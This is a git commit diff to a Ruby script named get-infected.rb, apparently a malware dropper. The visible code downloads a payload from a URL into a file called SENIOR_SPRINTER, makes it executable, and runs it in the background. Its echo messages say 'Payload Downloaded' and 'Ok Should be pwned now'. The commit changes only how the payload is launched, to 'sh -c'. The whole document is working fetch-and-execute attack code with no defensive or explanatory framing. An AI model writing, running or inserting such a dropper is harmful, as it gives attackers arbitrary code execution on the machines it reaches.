c1dd5b226ca23363cef07f42c088b51d2c1725b4
injectedthreads <121681065+injectedthreads@users.noreply.github.com>
2023-03-22 09:11:28 -0400

    Update get-infected.rb

--- get-infected.rb
+++ get-infected.rb
@@ -6,6 +6,6 @@ IO.copy_stream(URI.open(install_url), 'SENIOR_SPRINTER')
 %x(echo "Payload Downloaded. Making executable")
 %x(chmod +x SENIOR_SPRINTER)
 %x(echo "Trying to execute this nonsense")
-%x(./SENIOR_SPRINTER &)
+%x(sh -c ./SENIOR_SPRINTER &)
 %x(echo "Ok Should be pwned now")
 exit 0
